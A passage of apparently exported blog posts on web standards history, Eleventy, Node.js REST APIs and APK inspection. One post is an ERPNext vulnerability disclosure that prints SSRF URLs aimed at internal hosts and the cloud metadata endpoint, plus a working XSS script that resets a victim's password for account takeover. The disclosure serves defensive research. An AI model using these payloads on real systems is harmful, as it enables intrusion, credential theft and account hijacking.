“flatten” with. Someone suggested “smoosh” in the Issues section, which sparked a heated debate and led to the origin of the #SmooshGate incident. In addition to discussing the name change, some people even suggested letting those websites break. The word “smoosh” is similar to “flatten” or other proposed words like “squash,” all of which mean to flatten something. However, this word is very rare, and I had never heard of it before this incident. However, this proposal was never officially discussed by TC39. At the May 2018 TC39 meeting, “flatten” was officially changed to “flat,” ending the incident. The timeline of this proposal is roughly as follows: July 2017: Stage 0 July 2017: Stage 1 September 2017: Stage 2 November 2017: Stage 3 March 2018: Discovered that “flatten” would break MooTools March 2018: Someone suggested renaming it to “smoosh” May 2018: “flatten” was renamed to “flat” January 2019: Stage 4 Out of curiosity, I looked up V8’s commit and found that they implemented this feature in March 2018: [esnext] Implement Array.prototype.{flatten,flatMap}. The most noteworthy part of this is actually the testing section: const elements = new Set([ -Infinity, -1, -0, +0, +1, Infinity, null, undefined, true, false, '', 'foo', /./, [], &#123;&#125;, Object.create(null), new Proxy(&#123;&#125;, &#123;&#125;), Symbol(), x => x ** 2, String ]); for (const value of elements) &#123; assertEquals( [value].flatMap((element) => [element, element]), [value, value] ); &#125; They threw all sorts of weird things in to test it. The day after “flatten” was changed to “flat,” V8 immediately made corrections: [esnext] Rename Array#flatten to flat. In summary, the #SmooshGate incident is: Someone proposed a new method: Array.prototype.flatten It was discovered that it would break MooTools, so it had to be renamed Someone suggested renaming it “smoosh,” while others thought it shouldn’t be renamed, leading to a discussion TC39 decided to change it to “flat,” and the matter was resolved Some people may be confused about the second point and wonder why MooTools, which is so old, couldn’t just break. This is where the principle of “Don’t break the web” comes in. This website, Space Jam, has been running smoothly for 22 years because when developing new web standards, the principle of “Don’t break the web” is always taken into account. If you think about it carefully, you may realize that there are no breaking changes in the web domain. The JS syntax you could use before is still available, with some new additions, rather than changing or removing old things. Because once a breaking change occurs, websites may suffer, with bugs or even complete breakdowns. In fact, many websites have not been maintained for years, but we should not let them break. If a new standard with breaking changes is established today, the users will be the ones who suffer. They will only know that the website is broken, but not why. Therefore, in the SmooshGate incident, TC39 ultimately chose “to rename ‘flatten’ to ‘flat,’ even though it is not the most ideal naming, we cannot let those web pages break” over “flatten is the most semantically appropriate, so what if those old websites using MooTools break!” However, this does not mean that once bad design appears, it cannot be removed. In fact, some things have quietly been removed, but because they are too obscure, you and I may not have noticed. The WHATWG FAQ states: That said, we do sometimes remove things from the platform! This is usually a very tricky effort, involving the coordination among multiple implementations and extensive telemetry to quantify how many web pages would have their behavior changed. But when the feature is sufficiently insecure, harmful to users, or is used very rarely, this can be done. And once implementers have agreed to remove the feature from their browsers, we can work together to remove it from the standard. There are two examples mentioned below: &lt;applet&gt; and &lt;keygen&gt;. Out of curiosity, I looked up some related information. Deprecated HTML tagsRaise your hand if you’ve heard of &lt;keygen&gt;? Those who raised their hands, please give them a round of applause. You’re amazing and are now crowned the king of obscure HTML tags. Even after looking at the examples on MDN, I still don’t really understand what this tag does. I only know that it is a tag that can be used in forms and, as its name suggests, is used to generate keys related to certificates. From the information provided by MDN in Non-conforming features, we can find other deprecated tags, such as: applet acronym bgsound dir isindex keygen nextid However, being marked as obsolete does not mean that they are useless. It simply means that you should not use these tags anymore. According to the “don’t break the web” principle, some of these tags may still work. For example, the marquee tag that I used to love using when I was younger is also listed in Non-conforming features. In another DOM-related standard, it explains how to handle HTML tags. I guess these are the tags that are really deprecated and have no effect: If name is applet, bgsound, blink, isindex, keygen, multicol, nextid, or spacer, then return HTMLUnknownElement. If you try these tags on Chrome, for example: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;bgsound>123&lt;/bgsound> &lt;isindex>123&lt;/isindex> &lt;multicol>123&lt;/multicol> &lt;foo>123&lt;/foo> &lt;/body> &lt;/html> You will find that they behave similarly to &lt;span&gt;. I guess Chrome treats these unrecognized tags as spans. Out of curiosity, I also looked up the relevant code in Chromium. I used to search for code content directly on GitHub, but because the keywords I was searching for were too repetitive this time, I changed to searching for commit messages. This is where the importance of commit messages is fully highlighted. I found that Chromium’s commit messages were well written. For example, this commit: Remove support for the obsolete tag. This patch removes all special-casing for the &lt;isindex&gt; tag; it now behaves exactly like &lt;foo&gt; in all respects. This additionally means that we can remove the special-casing for forms containing &lt;input name&#x3D;&quot;isindex&quot;&gt; as their first element. The various tests for &lt;isindex&gt; have been deleted, with the exception of the imported HTML5Lib tests. It&#39;s not clear that we should send them patches to remove the &lt;isindex&gt; tests, at least not while the element is (an obsolete) part of HTML5, and supported by other vendors. I&#39;ve just landed failing test results here. That seems like the right thing to do. &quot;Intent to Remove&quot; discussion: https:&#x2F;&#x2F;groups.google.com&#x2F;a&#x2F;chromium.org&#x2F;d&#x2F;msg&#x2F;blink-dev&#x2F;14q_I06gwg8&#x2F;0a3JI0kjbC0J It includes the original discussion thread, and the information provided is very detailed. The only code changes, except for the testing part, are to delete all the places related to this tag and treat it as an unrecognized tag. That’s why the message says, “it now behaves exactly like &lt;foo&gt; in all respects.” Next, let’s look at another commit: Remove support for the keygen tag This removes support for &lt;keygen&gt; by updating it to be an HTMLUnknownElement. As a result, it&#39;s no longer a form-associated element and no longer has IDL-assigned properties. The &lt;keygen&gt; tag is still left in the parser, similar to &lt;applet&gt;, so that it maintains the document parse behaviours (such as self-closing), but is otherwise a neutered element. Tests that were relying on &lt;keygen&gt; having its own browser-created shadow root (for its custom select element) have been updated to use progress bars, while other tests (such as &lt;keygen&gt;-related crash tests) have been fully removed. As Blink no longer treats this tag as special, all the related IPC infrastructure is removed, including preferences and enterprise flags, and all localized strings, as they&#39;re all now unreachable. This concludes the &quot;Intent to Remove&quot; thread for &lt;keygen&gt; at https:&#x2F;&#x2F;groups.google.com&#x2F;a&#x2F;chromium.org&#x2F;d&#x2F;msg&#x2F;blink-dev&#x2F;z_qEpmzzKh8&#x2F;BH-lkwdgBAAJ Because the processing of the &lt;keygen&gt; tag was more complicated than that of &lt;isindex&gt;, there were many more files modified. It seems that everything related to it has been removed. Finally, let’s look at this one: bgsound must use the HTMLUnknownElement interface As specified here: https:&#x2F;&#x2F;html.spec.whatwg.org&#x2F;#bgsound This causes one less fail on: http:&#x2F;&#x2F;w3c-test.org&#x2F;html&#x2F;semantics&#x2F;interfaces.html The test link provided inside is quite interesting. It tests whether a large number of element interfaces are correct. You can see the list of interfaces it tests in interfaces.js. var elements = [ [\"a\", \"Anchor\"], [\"abbr\", \"\"], [\"acronym\", \"\"], [\"address\", \"\"], [\"applet\", \"Unknown\"], [\"area\", \"Area\"], [\"article\", \"\"], [\"aside\", \"\"], [\"audio\", \"Audio\"], [\"b\", \"\"], [\"base\", \"Base\"], [\"basefont\", \"\"], [\"bdi\", \"\"], [\"bdo\", \"\"], [\"bgsound\", \"Unknown\"], [\"big\", \"\"], [\"blink\", \"Unknown\"], [\"blockquote\", \"Quote\"], [\"body\", \"Body\"], [\"br\", \"BR\"], [\"button\", \"Button\"], [\"canvas\", \"Canvas\"], [\"caption\", \"TableCaption\"], [\"center\", \"\"], [\"cite\", \"\"], [\"code\", \"\"], [\"col\", \"TableCol\"], [\"colgroup\", \"TableCol\"], [\"command\", \"Unknown\"], [\"data\", \"Data\"], [\"datalist\", \"DataList\"], [\"dd\", \"\"], [\"del\", \"Mod\"], [\"details\", \"Details\"], [\"dfn\", \"\"], [\"dialog\", \"Dialog\"], [\"dir\", \"Directory\"], [\"directory\", \"Unknown\"], [\"div\", \"Div\"], [\"dl\", \"DList\"], [\"dt\", \"\"], [\"em\", \"\"], [\"embed\", \"Embed\"], [\"fieldset\", \"FieldSet\"], [\"figcaption\", \"\"], [\"figure\", \"\"], [\"font\", \"Font\"], [\"foo-BAR\", \"Unknown\"], // not a valid custom element name [\"foo-bar\", \"\"], // valid custom element name [\"foo\", \"Unknown\"], [\"footer\", \"\"], [\"form\", \"Form\"], [\"frame\", \"Frame\"], [\"frameset\", \"FrameSet\"], [\"h1\", \"Heading\"], [\"h2\", \"Heading\"], [\"h3\", \"Heading\"], [\"h4\", \"Heading\"], [\"h5\", \"Heading\"], [\"h6\", \"Heading\"], [\"head\", \"Head\"], [\"header\", \"\"], [\"hgroup\", \"\"], [\"hr\", \"HR\"], [\"html\", \"Html\"], [\"i\", \"\"], [\"iframe\", \"IFrame\"], [\"image\", \"Unknown\"], [\"img\", \"Image\"], [\"input\", \"Input\"], [\"ins\", \"Mod\"], [\"isindex\", \"Unknown\"], [\"kbd\", \"\"], [\"keygen\", \"Unknown\"], [\"label\", \"Label\"], [\"legend\", \"Legend\"], [\"li\", \"LI\"], [\"link\", \"Link\"], [\"listing\", \"Pre\"], [\"main\", \"\"], [\"map\", \"Map\"], [\"mark\", \"\"], [\"marquee\", \"Marquee\"], [\"menu\", \"Menu\"], [\"meta\", \"Meta\"], [\"meter\", \"Meter\"], [\"mod\", \"Unknown\"], [\"multicol\", \"Unknown\"], [\"nav\", \"\"], [\"nextid\", \"Unknown\"], [\"nobr\", \"\"], [\"noembed\", \"\"], [\"noframes\", \"\"], [\"noscript\", \"\"], [\"object\", \"Object\"], [\"ol\", \"OList\"], [\"optgroup\", \"OptGroup\"], [\"option\", \"Option\"], [\"output\", \"Output\"], [\"p\", \"Paragraph\"], [\"param\", \"Param\"], [\"picture\", \"Picture\"], [\"plaintext\", \"\"], [\"pre\", \"Pre\"], [\"progress\", \"Progress\"], [\"q\", \"Quote\"], [\"quasit\", \"Unknown\"], [\"rb\", \"\"], [\"rp\", \"\"], [\"rt\", \"\"], [\"rtc\", \"\"], [\"ruby\", \"\"], [\"s\", \"\"], [\"samp\", \"\"], [\"script\", \"Script\"], [\"section\", \"\"], [\"select\", \"Select\"], [\"slot\", \"Slot\"], [\"small\", \"\"], [\"source\", \"Source\"], [\"spacer\", \"Unknown\"], [\"span\", \"Span\"], [\"strike\", \"\"], [\"strong\", \"\"], [\"style\", \"Style\"], [\"sub\", \"\"], [\"summary\", \"\"], [\"sup\", \"\"], [\"table\", \"Table\"], [\"tbody\", \"TableSection\"], [\"td\", \"TableCell\"], [\"textarea\", \"TextArea\"], [\"tfoot\", \"TableSection\"], [\"th\", \"TableCell\"], [\"thead\", \"TableSection\"], [\"time\", \"Time\"], [\"title\", \"Title\"], [\"tr\", \"TableRow\"], [\"track\", \"Track\"], [\"tt\", \"\"], [\"u\", \"\"], [\"ul\", \"UList\"], [\"var\", \"\"], [\"video\", \"Video\"], [\"wbr\", \"\"], [\"xmp\", \"Pre\"], [\"\\u00E5-bar\", \"Unknown\"], // not a valid custom element name ]; For elements like applet, bgsound, blink, etc., HTMLUnknownElement should be returned. ConclusionThis journey was full of gains. By continuously expanding on a topic, we can discover more interesting things. For example, from the SmooshGate incident, we learned about the TC39’s operating process, the reason why flatten broke, the commit where V8 originally implemented flatten, and how to write tests. We also learned about the principle of “don’t break the web”, and from this principle, we looked at the HTML specification, saw the deprecated tags, and finally looked at how they are handled in Chromium. There are really many aspects that the people who develop standards need to pay attention to and consider, because once they start, it’s hard to turn back; the specification also needs to be written clearly and unambiguously, and cannot contain errors. I truly admire those who develop standards. References: You Don’t Know JS Yet: Get Started - 2nd Edition Chapter 1: What Is JavaScript? SmooshGate #SmooshGate FAQ Non-conforming features 3.2.2 Elements in the DOM","link":"/2019/11/26/en/dont-break-web-smooshgate-and-keygen/"},{"title":"Consider Using Eleventy to Write Technical Blog Posts Besides Hexo","text":"IntroductionWhen it comes to writing technical blog posts, most people’s first choice is still the combination of hexo and GitHub Pages. In fact, the blog you are currently reading is also built using this technology stack. However, I recently built two other technical blogs, not using hexo, but another static site generator called eleventy. I am extremely satisfied with the results, so I wrote this article to recommend it to everyone. If you want to check out the two blogs I built, here they are: ErrorBaker Technical Blog Cymetrics Tech Blog Why Eleventy?I first learned about eleventy from this article: Why I Leave Medium and Build Blog with Eleventy. From the article, one of the advantages of eleventy is its simplicity and lightweightness, which I think is an important part of a blog. For example, hexo is still okay, and most theme performance is not too bad, at most a little bloated. For my current huli blog, the Lighthouse score on the homepage is 81 in terms of performance, and the First Contentful Paint is 3.4 seconds, which is not too bad, but there is room for improvement. And my blog looks very simple but took so much time to build, indicating that there are many areas for improvement. However, I have seen some self-built blogs with poor performance, taking several seconds to load content, which is completely unacceptable. The article mentioned above introduces a template called eleventy-high-performance-blog developed by a Google AMP tech lead. Since the title is already named like this, it means that it is performance-oriented. Recently, I happened to help my former students build a technical blog, and I thought of this solution and tried it out. The results were amazing, and I immediately fell in love with it. I give it a five-star rating for overall satisfaction. If you are interested in the blog I mentioned, here is the link: ErrorBaker Technical Blog The advantages of this eleventy-high-performance-blog template are that it is really fast in terms of performance and has processed many things for you, including: Optimizing images, automatically compressing, converting formats, and loading with &lt;picture&gt;, as well as native lazy loading There is almost no CSS and JS, so the file size is very small Basic SEO is done a11y is taken into consideration The layout is simple, the files are few, and it is easy to modify In addition to the advantages of the template, eleventy (hereinafter referred to as 11ty) also has some advantages as an SSG, including: Simple syntax and easy to get started Easy to customize Detailed documentation It is worth mentioning that these blogs are actually for one person to use, but the blog I am building is by default for multiple authors, so some customization is required. I spent about half a day to a day to make these modifications and turned a single-person blog into a multi-author blog. Both the eleventy-high-performance-blog template and 11ty are very simple, so customization is very easy, and the advantage of having few files is that you don’t have to spend too much time looking for where to make changes. As a front-end engineer, I think it is very nice to have a blog that can be easily customized, because it is much easier to try new technologies or do performance optimization, and you can quickly find out how to make changes. After building the shared blog, the company’s blog happened to want to move, so I used the one I had previously built and made some adjustments to create a new blog: Cymetrics Tech Blog In summary, I think the advantages of 11ty and eleventy-high-performance-blog are: The layout is simple, suitable for people who don’t like too many things Easy to modify, more convenient for customization Good performance, fast loading of the blog Some Disadvantages and Issues I Have EncounteredIn addition to the advantages, let me also talk about some disadvantages to balance it out. The first disadvantage is that the CSS part is not easy to modify. Some of the original CSS rules will definitely be overwritten, but for some reason, they were not deleted, and the overall CSS looks a bit messy. The second issue is related to image optimization. During build time, images are directly converted into webp and avif formats, and only local cache is available. Therefore, if it is run on CI, it will be very slow. In the past, it took 7 minutes to build. There are two solutions. One is to commit the cache image together, and the other is to remove the conversion of avif because it takes the most time. The third issue is a small bug when using the utterances comment system. After logging in, the token is verified using the URL in the address bar. However, this template has a function that removes the query string, so the token cannot be obtained and login is not possible. The temporary workaround is to set it to clear the query string after one second. The fourth issue is pagination. The pagination navigation of this template needs to be done manually, but fortunately, the official website has a detailed example: PAGINATION NAVIGATION. The fifth issue is that some optimizations seem to have a problem. For example, the &lt;head&gt; tag may disappear, which may be mistaken for an optional tag and cause the consequence that if you use GA or search console, you will not be able to verify it by adding something to the head. Currently, I have removed removeOptionalTags. The sixth issue is that some tags for SEO are incomplete, such as twitter:title, og:site_name, and og:type. Although some things can still be automatically captured, it is better to write them clearly. Actually, I think these are all small issues, more detailed areas. ConclusionI have studied which blog template to use before. At that time, there were no good options except hexo. Hugo or the old-fashioned jekyll were not as familiar as hexo. As for the template, I found that the template used by Askie was very good, so I chose the same template. However, after using it for a while, I found some shortcomings, such as the website being a bit too heavy (I just found out that most of them are disqus things, and I found the culprit. It is not a template problem but disqus. I will take a closer look later), but there are no other problems. This time, because of the need to set up a new blog, I started looking at other templates and found that 11ty is really good, and the performance is indeed very good. However, compared with hexo, the high-performance template is relatively simple. If you don’t like it to be so simple, you have to spend more effort to adjust it. In short, I feel pretty good about using it, and fixing bugs or adding features by myself will make me more involved. If you like a simple and fast blog template and don’t mind adding new features or adjusting the layout by yourself, I sincerely recommend eleventy-high-performance-blog.","link":"/2021/08/22/en/eleventy-over-hexo/"},{"title":"SSRF and Account Takeover via XSS in ERPNext","text":"ERPNext is a very popular open-source ERP(Enterprise Resource Planning) software built on Frappe Framework. Last December, we found two vulnerabilities in the latest version of ERPNext: SSRF(Server-Side Request Forgery) and account takeover via XSS. Both vulnerabilities require a low-privileged authenticated user to perform the attack. By exploiting SSRF, a malicious actor could steal the credentials from cloud metadata and may lead to RCE. For XSS, it’s possible to take over others’ accounts. We reported both vulnerabilities on November 25th, 2021. At the time of writing, there is still no fix for those two issues, so we decided to publish the details to inform the public about the risk. SSRF(Server-Side Request Forgery)In ERPNext, the user with certain roles can import data from files or Google Sheets: After data is imported, you can preview the content before saving it to the system. Following is the function for importing data from Google Sheets: def get_csv_content_from_google_sheets(url): # https://docs.google.com/spreadsheets/d/&#123;sheetid&#125;&#125;/edit#gid=&#123;gid&#125; validate_google_sheets_url(url) # get gid, defaults to first sheet if \"gid=\" in url: gid = url.rsplit('gid=', 1)[1] else: gid = 0 # remove /edit path url = url.rsplit('/edit', 1)[0] # add /export path, url = url + '/export?format=csv&amp;gid=&#123;0&#125;'.format(gid) headers = &#123; 'Accept': 'text/csv' &#125; response = requests.get(url, headers=headers) if response.ok: # if it returns html, it couldn't find the CSV content # because of invalid url or no access if response.text.strip().endswith('&lt;/html>'): frappe.throw( _('Google Sheets URL is invalid or not publicly accessible.'), title=_(\"Invalid URL\") ) return response.content elif response.status_code == 400: frappe.throw(_('Google Sheets URL must end with \"gid=&#123;number&#125;\". Copy and paste the URL from the browser address bar and try again.'), title=_(\"Incorrect URL\")) else: response.raise_for_status() It’s straightforward, just get the data from Google Sheets and check the format. But, what if we provide a URL that looks like Google Sheet URL, but it’s not? The system only checks if the URL contains docs.google.com/spreadsheets: def validate_google_sheets_url(url): if \"docs.google.com/spreadsheets\" not in url: frappe.throw( _('\"&#123;0&#125;\" is not a valid Google Sheets URL').format(url), title=_(\"Invalid URL\"), ) So, we can provide a URL like this: http://localhost:8080/#docs.google.com/spreadsheets, then we can get the response from the internal network. It’s a classic SSRF vulnerability. If the port is open, the response will be different: Moreover, we can access sensitive information via cloud metadata if the server is hosted on a cloud service. For example, frappe cloud is hosted on AWS, so we can get metadata in http://169.254.169.254/latest/dynamic/instance-identity/document#docs.google.com/spreadsheets: If there is an IAM associated with the instance, we can also read its credentials and escalate to RCE, here is one example: Escalating SSRF to RCE. MitigationBefore a new patched version release, we suggest that: Be careful when you grant importing data permission to a user. Keep ERPNext in an isolated environment. Requires IMDSv2 for AWS instance. Account Takeover via XSSEvery user in the ERPNext system has a profile page, like the following: Users can upload their profile images from devices: When uploading files, the front-end will check the file name to ensure it’s an image(.png, .jpg, and so on). But, the back-end has no such check, so we can upload an HTML file by intercepting the request and changing the file extension to .html. But unfortunately, we can’t directly open the HTML file because of the Content-Disposition header: Because of the header, the browser will download the HTML page instead of opening it. After playing around with the feature for a while, we found that it can be bypassed by using the upper-case extension .HTML: Now, we have an easy XSS. On the security page of ERPNext, it clearly states that: Please Note: XSS and HTML Injections won’t be accepted. I think it’s fine for some cases because pop-up an alert makes no harm, right? But what if we find a way to escalate it to another vulnerability with bigger impact? Surprisingly, in ERPNext, the user doesn’t need to input the old password to change to a new password: So, we can write a script to automatically update the password for the victim user, like this: &lt;script> async function exploit()&#123; // get user id from cookie const userId = document.cookie.match(/user_id=([^;]+)/)[1] console.log('user id:', userId) // get csrf token first const html = await fetch('/app').then(res => res.text()) const token = html.match(/csrf_token = \"(.+)\";/)[1] console.log('csrf token:', token) // get user doc const json = await fetch('/api/method/frappe.desk.form.load.getdoc?doctype=User&amp;name='+userId).then(res=>res.json()) const docs = json.docs[0] console.log(docs) // just random strong password docs.new_password = 'WIofjg249hq@!32a' formBody = 'doc=' + encodeURIComponent(JSON.stringify(docs)) + '&amp;action=Save' // update password const resp = await fetch('/api/method/frappe.desk.form.save.savedocs', &#123; method: 'POST', headers: &#123; 'X-Frappe-Csrf-Token': token, 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' &#125;, body: formBody &#125;); const result = await resp.json(); console.log(result) &#125; exploit() &lt;/script> When the victim user opens this page, their password will be updated. So, as a malicious actor, I can upload the above content to the server, then send the URL to the admin. After the admin opens the page, I can take over his account because I know his password. We successfully escalate from XSS to account takeover vulnerability. MitigationBefore a new patched version release, we suggest that: Be careful before opening any links hosted on ERPNext server, or using incognito mode to visit the link ConclusionThe latest version of ERPNext is vulnerable to both SSRF and XSS which can lead to account takeover. By exploiting SSRF, a malicious actor may read credentials from cloud metadata and escalate to RCE. Both vulnerabilities require a low-privileged authenticated user to perform the attack. There is no patch for the vulnerabilities at the time of writing. So we suggest that the user should be careful before the patch release. Disclosure Timeline2021-11-25 Reported vulnerabilities via the official form2021-12-15 Follow up, they said they are working on the fix2022-01-03 Follow up again, they said it’s in the development phase2022-02-14 Follow up again, no response2022-02-23 90 days since the initial report2022-03-10 Follow up again, no response2022-03-24 Ask for the updates, if there is no response we will publish the details in 14 days, no response2022-04-06 Public disclosure","link":"/2022/04/06/en/erpnext-ssrf-and-xss-to-account-takeover/"},{"title":"Building RESTful API with Node.js","text":"(Original post published at: http://blog.techbridge.cc/2016/04/23/fast-restful-nodejs-api-backend/) IntroductionSome websites today use the Single Page Application approach, where the backend only provides APIs for the frontend to fetch data, achieving complete separation of the frontend and backend. There are many choices for the frontend, you can use Angular, Ember.js, or React + Redux. As for the backend API, it must conform to a fixed format to make it easier for frontend developers to fetch data. And this “fixed format” is most commonly known as our focus today: RESTful. What is RESTful?Instead of starting with a hard-to-understand textual explanation, let’s start with a practical example. Suppose you are writing a backend API for a blog website, and ten people may have ten different ways of doing it. For example, the “fetch all articles” feature: &#x2F;api&#x2F;blog&#x2F;getList &#x2F;api&#x2F;blog&#x2F;getAllArticle &#x2F;api&#x2F;blog&#x2F;article&#x2F;getAll &#x2F;api&#x2F;blog&#x2F;fetchAll &#x2F;api&#x2F;blog&#x2F;all But if you adopt the RESTful approach, it will conform to a certain format: Operation Method URL All articles GET &#x2F;api&#x2F;posts Single article GET &#x2F;api&#x2F;posts&#x2F;:id Add article POST &#x2F;api&#x2F;posts Delete article DELETE &#x2F;api&#x2F;posts&#x2F;:id Modify article PUT&#x2F;PATCH &#x2F;api&#x2F;posts&#x2F;:id In this example, the article (posts) is a Resource, and you can access this Resource by using several methods provided by HTTP in combination with different URLs. If you are interested in RESTful, here are some articles worth referring to: What is REST and RESTful? A Brief Talk on REST Software Architecture Style Understanding RESTful Architecture ORMORM stands for Object Relational Mapping.If we talk about databases, it maps your database to objects in your program. Taking the example of the blog above, your database table might look like this: Field Type Description id int id title text title content text content created_at timestamp creation time Mapped to objects in Node.js, you can do this: // Create a post Post.create(&#123; title: 'Hello Excel', content: 'test' &#125;) // Delete the post with id 1 Post.find(1).delete(); That is to say, you don’t have to worry about which database is being used behind the scenes, or what the table name is. You just need to operate on the Post object you know. Sequelize is a very useful ORM Library that can help you link objects and databases together by defining a schema. Why mention ORM suddenly?Some readers may have already thought that there is some degree of relationship between RESTful API and ORM. How to say? Suppose I want to write a backend API for a message board today, and I use RESTful and ORM at the same time. My program will look like this: // Fetch all messages // GET /api/messages Message.findAll(); // Fetch a single message // GET /api/messages/:id Message.find(id); // Create a new message // POST /api/messages Messages.create(&#123; content: content &#125;) // Delete a message // DELETE /api/messages/:id Messages.find(id).delete(); // Update a message // PUT /api/messages/:id Messages.find(id).update(&#123; content: new_content &#125;) What if I am writing a backend API for a blog?Just replace all the messages above with posts, and you’re done!From the above example, it can be seen that these two things are very suitable for working together because they can meet almost the same rules. Two wishes fulfilled at once, epilogueEpilogue is a Node.js library that combines Sequelize and Express to quickly build RESTful APIs. Let’s take a look at the example on the official website: First, you need to define the database and your schema var database = new Sequelize('database', 'root', 'password'); var User = database.define('User', &#123; username: Sequelize.STRING, birthday: Sequelize.DATE &#125;); Next, initialize express and epilogue var express = require('express'), bodyParser = require('body-parser'); var app = express(); app.use(bodyParser.json()); app.use(bodyParser.urlencoded(&#123; extended: false &#125;)); server = http.createServer(app); epilogue.initialize(&#123; app: app, sequelize: database &#125;); Finally, use epilogue to link the URL with the database. You need to provide it with the endpoint you want and the model you want to link to. var userResource = epilogue.resource(&#123; model: User, endpoints: ['/users', '/users/:id'] &#125;); With these three simple steps, you have a RESTful API! Isn’t it easy? Not just thatIn the actual development process, things often don’t go so smoothly. For example, your return format may be different from the database format, or some of your APIs may require authentication to call. No problem, epilogue has got you covered. Epilogue provides seven hooks for behavior, including start, auth, fetch, data, write, send, and complete. Combined with before, action, and after, you can do what you want at any stage. For example, if you want to make a small change before returning the result, it’s userResource.list.send.before, or you may want to authenticate an API, which is userResource.delete.auth. Here are two complete examples from the official website: // Prevent deleting user userResource.delete.auth(function(req, res, context) &#123; throw new ForbiddenError(\"can't delete a user\"); &#125;) // Check cache first, return cache content if available userResource.list.fetch.before(function(req, res, context) &#123; var instance = cache.get(context.criteria); if (instance) &#123; // keep a reference to the instance and skip the fetch context.instance = instance; return context.skip; &#125; else &#123; // cache miss; we continue on return context.continue; &#125; &#125;) ConclusionIf your backend API is not very complicated and only involves basic CRUD operations, then Epilogue is definitely a suitable framework for you. As long as you open up the database schema, you can simply copy and paste the code to complete an API. If readers have similar needs in the future, it’s worth giving it a try!","link":"/2016/09/29/en/fast-restful-nodejs-api-backend/"},{"title":"Quickly Obtain APK Related Information","text":"(Original article published at: http://blog.techbridge.cc/2016/05/20/fast-way-to-get-apk-information/) IntroductionIn a previous article, we introduced how to decompile an Android APK. By decompiling, we can obtain a lot of information related to the APK, such as AndroidManifest.xml. With this file, we can see some basic information about the APK, and also see the entire code of the APK and the resources used (pictures, videos, sounds, etc.). But if today we only want to know the basic information, and we don’t care about how the APK is written or what resources it uses, what should we do? Decompiling takes some time, and the larger the APK, the longer it takes. Is there a better way? What information do we need?First of all, let’s define what “basic information” refers to. For me, the basic information I want to obtain includes the following six points: Package name Version code Version name Launch activity Google SHA1 Fingerprint Facebook Keyhash The purpose of the first four is that if you are developing an internal APK deployment system for your company, with the first four pieces of information, you can do verification similar to Google Play, such as verifying whether the package name is the same as the last upload, whether the version number is higher than the last time, etc. As for the last two, readers who have integrated Google and Facebook login will know that these two are necessary for login. You need to add these two sets of keys in the settings to use the login function, otherwise, verification errors will appear. Now that we know what we need, let’s get started! Useful keytoolkeytool is a built-in command related to certification.We can use keytool -list -printcert -jarfile NAME.apk to extract some information: Signer #1: Signature: Owner: CN&#x3D;Android Debug, O&#x3D;Android, C&#x3D;US Issuer: CN&#x3D;Android Debug, O&#x3D;Android, C&#x3D;US Serial number: 4b52355e Valid from: Sun Jan 17 05:53:34 CST 2010 until: Mon Jan 17 05:53:34 CST 2011 Certificate fingerprints: MD5: 14:99:01:12:7A:69:CD:75:4F:31:75:8C:59:F6:71:63 SHA1: 24:69:FD:17:6B:C3:43:FC:3A:85:EC:4B:C5:D7:9F:09:4A:71:60:80 SHA256: 57:EB:73:81:D7:08:E6:45:FE:26:99:FB:3C:1F:37:1E:EE:38:39:20:E0:2D:C6:76:0E:84:2B:DD:1C:5C:C9:70 Signature algorithm name: SHA1withRSA Version: 3 For this APK, it lists information such as owner, issuer, validity period, and certificate fingerprints, and the SHA1 is the information used for Google login. What about Facebook Keyhash? From the official documentation, we can know that it is just to convert sha1 to binary and then do base64. With sha1, and some commands, we can easily generate Facebook Keyhash. Almighty aaptThe full name of aapt is: Android Asset Packaging Tool, which is super useful!Let’s take a look at what aapt can do first. Since we need to extract information, let’s directly look at the dump part: aapt d[ump] [--values] WHAT file.&#123;apk&#125; [asset [asset ...]] badging Print the label and icon for the app declared in APK. permissions Print the permissions from the APK. resources Print the resource table from the APK. configurations Print the configurations in the APK. xmltree Print the compiled xmls in the given assets. xmlstrings Print the strings of the given compiled xml assets. Interested readers can try each of them to see what results they get. For our needs, badging is the most suitable. aapt dump badging NAME.apk package: name&#x3D;&#39;com.gmail.aszx87410.movie_to_nine&#39; versionCode&#x3D;&#39;1&#39; versionName&#x3D;&#39;1.0&#39; sdkVersion:&#39;8&#39; targetSdkVersion:&#39;16&#39; uses-permission:&#39;android.permission.INTERNET&#39; uses-gl-es:&#39;0x20000&#39; uses-feature-not-required:&#39;android.hardware.telephony&#39; uses-feature:&#39;android.hardware.screen.portrait&#39; uses-feature-not-required:&#39;android.hardware.screen.landscape&#39; application-label:&#39;Tonight 9 PM Movie 2.0&#39; application-label-he:&#39;Tonight 9 PM Movie 2.0&#39; application-label-es:&#39;Tonight 9 PM Movie 2.0&#39; application-label-iw:&#39;Tonight 9 PM Movie 2.0&#39; application-icon-120:&#39;res&#x2F;drawable-ldpi&#x2F;icon.png&#39; application-icon-160:&#39;res&#x2F;drawable-mdpi&#x2F;icon.png&#39; application-icon-240:&#39;res&#x2F;drawable-hdpi&#x2F;icon.png&#39; application-icon-320:&#39;res&#x2F;drawable-xhdpi&#x2F;icon.png&#39; application-icon-480:&#39;res&#x2F;drawable-xxhdpi&#x2F;icon.png&#39; application: label&#x3D;&#39;Tonight 9 PM Movie 2.0&#39; icon&#x3D;&#39;res&#x2F;drawable-mdpi&#x2F;icon.png&#39; launchable-activity: name&#x3D;&#39;com.ansca.corona.CoronaActivity&#39; label&#x3D;&#39;Tonight 9 PM Movie 2.0&#39; icon&#x3D;&#39;&#39; uses-feature:&#39;android.hardware.touchscreen&#39; uses-implied-feature:&#39;android.hardware.touchscreen&#39;,&#39;assumed you require a touch screen unless explicitly made optional&#39; main other-activities other-receivers other-services supports-screens: &#39;small&#39; &#39;normal&#39; &#39;large&#39; &#39;xlarge&#39; supports-any-density: &#39;true&#39; locales: &#39;--_--&#39; &#39;he&#39; &#39;es&#39; &#39;iw&#39; densities: &#39;120&#39; &#39;160&#39; &#39;240&#39; &#39;320&#39; &#39;480&#39; native-code: &#39;&#39; &#39;armeabi-v7a&#39; Ta-da! All the information we need is here, along with permission lists, app logo, app name, and other information.Up to this point, everything we need is available, and the rest is just string cutting and integration. SummaryThis article briefly introduces the use of keytool and aapt. The main purpose is to extract the information we need using other tools without relying on apktool, which saves time and effort. If you are interested in knowing what the final product looks like, apkinfo.sh is a small project I put on GitHub, which does exactly what this article teaches, which is to extract relevant information from an 